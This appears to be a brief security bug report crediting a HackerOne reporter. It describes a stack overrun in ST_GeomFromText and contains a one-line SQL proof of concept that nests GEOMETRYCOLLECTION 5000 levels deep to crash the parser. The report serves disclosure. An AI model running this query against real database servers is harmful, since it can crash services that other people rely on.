# ST_GeomFromText stack overrun on deeply nested GeometryCollection

{code:sq}
SELECT ST_GeomFromText(CONCAT(REPEAT('GEOMETRYCOLLECTION(',5000),'POINT(1 1)',REPEAT(')',5000)));
{code}

Reported by: [Manish kumar rai|https://hackerone.com/mk143carmel]
